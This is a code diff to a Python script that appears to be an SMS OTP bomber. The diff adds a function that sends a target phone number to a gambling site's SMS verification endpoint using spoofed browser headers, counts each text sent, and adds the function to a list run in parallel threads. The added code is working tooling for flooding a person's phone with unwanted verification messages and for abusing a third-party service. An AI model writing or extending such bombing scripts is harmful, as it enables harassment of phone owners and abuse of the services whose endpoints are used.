@@ -394,7 +394,35 @@ def otp10(number):
         if debugError == True:
             ic(f"\033[1;91mError otp10\033[1;92m")
         return False
-
+    
+def otp11(number):
+    {"success":True,"value":{"expiredMinutes":5,"maxAttemptTimes":10,"expirationTime":1709109655053}}
+    global LIMIT, ERROR
+    number = to09(number=number)
+    session = requests.Session()
+    url = "https://www.luxeplay.ph/wps/verification/sms/register"
+    header = {'Host': 'www.luxeplay.ph','Connection': 'keep-alive','Content-Length': '26','X-Gateway-Version': '3','sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Brave";v="122"','Language': 'EN','sec-ch-ua-mobile': '?0','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36','Content-Type': 'application/json','Merchant': 'crazywin','Accept': 'application/json, text/plain, */*','Device': 'web','sec-ch-ua-platform': '"Windows"','Sec-GPC': '1','Accept-Language': 'en-US,en;q=0.6','Origin': 'https://www.luxeplay.ph','Sec-Fetch-Site': 'same-origin','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://www.luxeplay.ph/register?affiliateCode=q4l3v','Accept-Encoding': 'gzip, deflate, br'}
+    body = {"mobileNo": str(number)}
+    
+    try:
+        web = session.post(url, headers=header, json=body)
+        result=json.loads(web.text)
+        if debug == True:
+            ic(f"{web.status_code} from luxeplay")
+        if result['success'] == True:
+            LIMIT += 1
+            return True
+        elif result['success'] == False:
+            ERROR += 1
+            return False
+        else:
+            ERROR += 1
+            return False
+    except:
+        ERROR += 1
+        if debugError == True:
+            ic(f"\033[1;91mError otp10\033[1;92m")
+        return False
 # you can add api and put it in the box to run
 
 # mainporcesore
@@ -439,7 +467,7 @@ def home():
     print("\033[1;92m║ \033[1;94m—> \033[1;92mLIMIT")
     # all process put in the box to put in multiprocess
     function = [otp, otp1, otp2, otp3, otp4,
-                otp5, otp6, otp7, otp8, otp9, otp10]
+                otp5, otp6, otp7, otp8, otp9, otp10, otp11]
     # append LIMIT in global variables
     LIMIT1 = pick()
     print("\033[1;92m║ \033[1;94m—> \033[1;92mThreads Sleep default:1")
